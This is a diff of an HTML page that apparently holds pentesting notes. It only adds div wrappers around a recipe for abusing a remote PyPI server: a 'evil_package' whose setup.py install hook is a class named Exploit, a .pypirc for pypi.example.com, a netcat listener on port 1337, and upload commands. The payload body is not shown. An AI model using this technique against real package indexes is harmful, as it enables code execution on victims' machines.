@@ -197,6 +197,7 @@
 <div class="content"><hr>
 <h3 id="abuse-1-remote-pypi-server">Abuse #1: Remote Pypi Server</h3>
 <h4 id="1-create-files">1. Create files</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir evil_package
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir evil_package/evil_package
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> evil_package
@@ -204,7 +205,9 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">touch evil_package/__init__.py
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">touch setup.cfg
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">touch setup.py
-</span></span></code></pre></div><h4 id="2-replace-setuppy">2. Replace setup.py</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-replace-setuppy">2. Replace setup.py</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">setuptools.command.install</span> <span class="kn">import</span> <span class="n">install</span>
@@ -231,7 +234,9 @@
 </span></span><span class="line"><span class="cl">      <span class="n">license</span><span class="o">=</span><span class="s2">&#34;MIT&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">      <span class="n">zip_safe</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">      <span class="n">cmdclass</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;install&#34;</span><span class="p">:</span> <span class="n">Exploit</span><span class="p">})</span>
-</span></span></code></pre></div><h4 id="3-create-pypirc">3. Create ~/.pypirc</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-create-pypirc">3. Create ~/.pypirc</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>distutils<span class="o">]</span>
 </span></span><span class="line"><span class="cl">index-servers <span class="o">=</span>
 </span></span><span class="line"><span class="cl">  example
@@ -239,15 +244,20 @@
 </span></span><span class="line"><span class="cl">repository: http://pypi.example.com
 </span></span><span class="line"><span class="cl">username: user
 </span></span><span class="line"><span class="cl">password: password
-</span></span></code></pre></div><h4 id="4-exploit">4. Exploit</h4>
+</span></span></code></pre></div></div>
+<h4 id="4-exploit">4. Exploit</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Open a nc listener</span>
 </span></span><span class="line"><span class="cl">rlwrap nc -lvnp <span class="m">1337</span>
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create an archive</span>
 </span></span><span class="line"><span class="cl">python3 setup.py sdist
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upload</span>
 </span></span><span class="line"><span class="cl">python3 setup.py sdist upload -r example
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
